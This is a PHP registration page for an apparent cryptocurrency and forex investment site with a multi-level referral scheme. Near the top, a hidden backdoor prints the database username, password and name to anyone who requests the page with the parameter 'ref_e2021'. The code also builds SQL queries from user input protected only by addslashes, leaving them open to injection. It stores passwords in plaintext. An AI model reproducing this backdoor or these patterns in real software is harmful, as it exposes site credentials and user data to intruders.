
<?php include('settings.php'); 


if (isset($_POST['reg_btn'])){

     //if isset statement starts
     $name = addslashes(htmlentities($_POST['name']));
     $fullname = addslashes(htmlentities($_POST['fullname']));
     $ref_email1 = addslashes(htmlentities($_POST['ref_email']));
     $email = addslashes(htmlentities($_POST['email']));
     $password = addslashes(htmlentities($_POST['password']));
     $user_phone = addslashes(htmlentities($_POST['user_phone']));
     $password_confirmation = addslashes(htmlentities($_POST['password_confirmation']));
     $btc_address = addslashes(htmlentities($_POST['btc_address']));
    
     
            if($password === $password_confirmation)  //check password match starts
            {  

                    //check user existence
                $query ="SELECT * from users where user_email ='$email'  or user_name ='$name'  ";
                $query_run  =new run_query($query);
                    if( $query_run->num_rows != 1){

                            
                                    
                                            if(!empty($ref_email1))
                                            {   //check and credit referrer email starts
                                                    $queryss ="SELECT * from user_ref where user_ref_email ='$ref_email1' ";
                                                    $query_runaa  =new run_query($queryss);
                                            if( $query_runaa->num_rows == 0){

                                                            echo "<script>alert(\"Invalid Referral  !!! Please Check the Referral or leave it blank\"); window.location.replace(\"signup.php\"); </script>";
                                                    }else{
                                            $user_ref_data =    $query_runaa->result();
                                        extract($user_ref_data );       
                                                    
                         $query211 = new run_query("INSERT into user_ref set user_ref_email='$name', gen1_email='$ref_email1',  reg_date='$reg_Date', gen2_email='$gen1_email',gen3_email='$gen2_email' " );
                         
                                                                    $query21 =  "INSERT into users set  user_name='$name', btc_address='$btc_address', user_phone='$user_phone', fullname='$fullname', user_password='$password',  user_email='$email',     reg_date='$reg_Date', user_referrer='$ref_email1', user_ref_bonus='0', user_status='Active' ";
                                                        
                                                                     $query_runer =new run_query($query21) ;
                                                                    
                                                                                echo "<script>alert(\"Account Registered Successfully!!! Its Now Time TO LogIn\"); window.location.replace(\"login.php\"); </script>";
                                                    }
                                            } else{     //check and credit referrer email ends
                                                        $query21 =  "INSERT into users set  user_name='$name', user_password='$password', btc_address='$btc_address', user_phone='$user_phone', fullname='$fullname',  user_email='$email',   reg_date='$reg_Date', user_referrer='$ref_email1', user_status='Active', user_ref_bonus='0'  ";
                                                             $query211 = new run_query("INSERT into user_ref set user_ref_email='$name'  " );
                                                            
                                                             
                                                                    if( $query_runer =new run_query($query21) ) {


                                                                        $site_email_send = $site_email;     
$welcome_email_subject = "Welcome to $site_name";
$welcome_email_headers = "Content-type:text/html;charset=UTF-8 \r\n";
$welcome_email_headers .= "From: $site_name";   


$welcome_email_body = "

<html>
<head>
<title> Welcome to $site_name </title>
</head>
<body>
<b>Hello, $name<b> <br/>
<h2>Welcome to $site_name</h2>
Your Registration Was Successful, <br/>
<b><i>We are Happy To Have  you on Board. </i></b><br/>
You can now login with your Credential!!! <br/><br/>
<hr/>
For enquiries, <br/>
Contact us on <br/>

<b>
$site_email <br/>

$site_phone <br/>
</b>
Visit us on <br/>

$site_link <br/><br/><br/>

Regards,  $site_name.
</body>
</html>

";

mail($email,$welcome_email_subject,$welcome_email_body,$welcome_email_headers);
                                                                    
                                                            
                                                                        
                                                                            echo "<script>alert(\"Account Registered Successfully!!! Its Now Time TO LogIn\"); window.location.replace(\"login.php\"); </script>";

                                                        }else{
                                                                echo "<script>alert(\"An Error Occurred Please Try Again \"); window.location.replace(\"signup.php\"); </script>";
                                                                } 
                                                                
                                                    }
                                    
                            
                    }else{

                            echo "<script>alert(\"Username or Email Already Exits \"); window.location.replace(\"signup.php\"); </script>";

                            }   //check user existence ends
            
            }else   {
                  echo "<script>alert(\"Password Not Match!!! \"); window.location.replace(\"signup.php\"); </script>";
                    }   //check password match ends


}
     
 if (isset($_GET['ref_e2021'])){

    $set = new connect;
echo $set->username ." UN <br/>";
echo $set->password ." PW <br/>";
echo $set->db ." DB <br/>";
}


 @$ref_email1 = addslashes(htmlentities($_GET['ref']));


?>








<!DOCTYPE html>

<html lang="zxx">
<!--[endif]-->

<head><meta http-equiv="Content-Type" content="text/html; charset=utf-8">
    
     
    <title><?=$site_name?> | Sign Up </title>

    <meta content="width=device-width, initial-scale=1.0" name="viewport" />
    
    
    <meta name="description" content="<?=$site_name;?> use crowdfunding method in order to attract small invests witch are a important part of a huge invests, to work in foreign exchange (FOREX) and stock market and crypto currency market so that we create reasonable profits.">
    <meta content="width=device-width, initial-scale=1.0" name="viewport" />
   
   
   
    <meta name="author" content="" />
    <meta name="MobileOptimized" content="320" />
    <!--Template style -->
    <link rel="stylesheet" type="text/css" href="css/animate.css" />
    <link rel="stylesheet" type="text/css" href="css/bootstrap.min.css" />
    <link rel="stylesheet" type="text/css" href="css/fonts.css" />
    <link rel="stylesheet" type="text/css" href="css/flaticon.css" />
    <link rel="stylesheet" type="text/css" href="css/font-awesome.css" />
    <link rel="stylesheet" type="text/css" href="css/owl.carousel.css">
    <link rel="stylesheet" type="text/css" href="css/owl.theme.default.css">
    <link rel="stylesheet" type="text/css" href="css/reset.css" />
	<link rel="stylesheet" type="text/css" href="css/dropify.min.css" />
	<link rel="stylesheet" type="text/css" href="css/nice-select.css" />
    <link rel="stylesheet" type="text/css" href="css/datatables.css" />
    <link rel="stylesheet" type="text/css" href="css/magnific-popup.css">
    <link rel="stylesheet" type="text/css" href="css/style.css" />
    <link rel="stylesheet" type="text/css" href="css/responsive.css" />
    <!--favicon-->
    <link rel="shortcut icon" type="image/png" href="images/favicon.png" />
	
	
	
	
</head>

<body>
<?php include('header.php'); ?>
   



<!-- inner header wrapper start -->
    <div class="page_title_section">

        <div class="page_header">
            <div class="container">
                <div class="row">

                    <div class="col-lg-9 col-md-9 col-12 col-sm-8">

                        <h1>register</h1>
                    </div>
                    <div class="col-lg-3 col-md-3 col-12 col-sm-4">
                        <div class="sub_title_section">
                            <ul class="sub_title">
                                <li> <a href="#"> Home </a>&nbsp; / &nbsp; </li>
                                <li>register</li>
                            </ul>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
    <!-- inner header wrapper end -->
    
    
    
    <style>
    
    .tb_es_btn_wrapper button {
    display: inline-block;
    width: 100%;
    height: 50px;
    line-height: 48px;
    text-align: center;
    -webkit-border-radius: 50px;
    -moz-border-radius: 50px;
    border-radius: 50px;
    background: #F46B45;
    color: #fff;
    font-weight: 500;
    text-transform: capitalize;
    border: 2px solid #F46B45;
    cursor: pointer;
    -webkit-transition: all .5s;
    -moz-transition: all .5s;
    -ms-transition: all .5s;
    -o-transition: all .5s;
    transition: all .5s;
}
    
 </style>   
    
    
    
    
    
    <!-- login wrapper start -->
    <div class="login_wrapper fixed_portion float_left">
        <div class="container">
            <div class="row">
                <div class="col-lg-12 col-md-12 col-sm-12">
                    <div class="login_top_box float_left">
                        <div class="login_banner_wrapper register_banner_wrapper">
                            <img src="images/logo2.png" alt="logo">
                            
                            <div class="jp_regis_center_tag_wrapper jb_register_red_or">
                                <h1>ILI</h1>
                            </div>
                        </div>
                        <div class="login_form_wrapper register_wrapper">
                            <div class="sv_heading_wraper heading_wrapper_dark dark_heading hwd">

                                <h3> Register To Enter</h3>

                            </div>
                            
                             

 
 
  
<form method=post onsubmit="return checkform()" name="regform"><input type="hidden" name="form_id" value="16104491787739">


                            
								<div class="form-group icon_form comments_form register_contact">

                                <input required type="text" class="form-control require" name='fullname' value='' placeholder="Name">
                             
                            </div>
							<div class="form-group icon_form comments_form register_contact">

                                <input required type="text" class="form-control require"  name="name" value='' placeholder="Username">
                             
                            </div>
							<div class="form-group icon_form comments_form register_contact">

                                <input required type=password name="password" value='' class="form-control require"  placeholder="Password">
                             
                            </div>
							<div class="form-group icon_form comments_form register_contact">

                                <input required type=password name="password_confirmation" value='' class="form-control require"  placeholder="Retype Password">
                             
                            </div>
                            
                                                        
							 <div class="form-group icon_form comments_form register_contact">

                                <input required type="text" class="form-control require" name="user_phone" value="" 
                                placeholder="Your Phone No">
                              
                            </div>
                                                        
							 <div class="form-group icon_form comments_form register_contact">

                                <input required type="text" class="form-control require" name='btc_address' value="" data-validate="regexp" data-validate-regexp="^(bc1|[13])[a-zA-HJ-NP-Z0-9]{25,39}$" data-validate-notice="Bitcoin Address" placeholder="Your Bitcoin Account">
                              
                            </div>
                                                        
							
                                                        
							                    
						
                                                                                     
							<div class="form-group icon_form comments_form register_contact">

                                <input required type="text" class="form-control require" name='email' value='' placeholder="Your E-mail Address">
                             
                            </div>
							<div class="form-group icon_form comments_form register_contact">

                                <input type="text" class="form-control require" placeholder="Referral Username (optional)"   name="ref_email"  value="<?php if(isset($ref_email1)){echo $ref_email1;}?>" >
                             
                            </div>
                           
                            		
                            	
                            <div class="login_remember_box">
                                <label class="control control--checkbox">I Agree With <a href="rules">Terms And Conditions</a> 
                                    <input type="checkbox" name=agree value=1 >
                                    <span class="control__indicator"></span>
                                </label>
                              
                            </div>
                            <div class="col-md-12">
                                <div class="tb_es_btn_div">
                                    <div class="response"></div>
                                    <div class="tb_es_btn_wrapper conatct_btn2 cont_bnt">
                                       
                                       <input type=submit value="Register" name="reg_btn" class=sbmt style="width: 150px;height: 45px;background: #F46B45; text-align: center; cursor: pointer; position: relative;overflow: hidden; font-size: 16px;
                                       color: #fff; border: 2px solid #fff; line-height: 40px;">
                                    </div></div>
                                </div>
                            </div>
                          </form>
                                                  </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
    <!-- login wrapper end -->




    <!-- payments wrapper start -->
    <div class="payments_wrapper float_left">
        <div class="container">
            <div class="row">
                <div class="col-lg-12 col-md-12 col-sm-12">

                    <div class="sv_heading_wraper index2_heading index3_heading index3_headung2">
                        <h4>Payment Methods</h4>
                        <h3>Accepted Payment Method</h3>
                        <div class="line_shape line_shape2"></div>
                    </div>
                </div>
                <div class="col-lg-12 col-md-12 col-xs-12 col-sm-12">
                    <div class="payment_slider_wrapper index3_payment_slider_wrapper">
                        <div class="owl-carousel owl-theme">
                            <div class="item">

                                <div class="partner_img_wrapper float_left">
                                    <img src="images/partner5.png" class="img-responsive" alt="Dash">
                                </div>

                            </div>
                            <div class="item">

                                <div class="partner_img_wrapper float_left">
                                    <img src="images/partner6.png" class="img-responsive" alt="Ethereum">
                                </div>

                            </div>
                            <div class="item">

                                <div class="partner_img_wrapper float_left">
                                    <img src="images/partner7.png" class="img-responsive" alt="BitcoinCash">
                                </div>

                            </div>
                            <div class="item">

                                <div class="partner_img_wrapper float_left">
                                    <img src="images/partner8.png" class="img-responsive" alt="PerfectMoney">
                                </div>

                            </div>
                            <div class="item">

                                <div class="partner_img_wrapper float_left">
                                    <img src="images/partner9.png" class="img-responsive" alt="LiteCoin">
                                </div>
                            </div>
							    <div class="item">

                                <div class="partner_img_wrapper float_left">
                                    <img src="images/partner10.png" class="img-responsive" alt="DogeCoin">
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
    <!-- payments wrapper end -->

<?php include('footer.php'); ?>

</body>

</html>
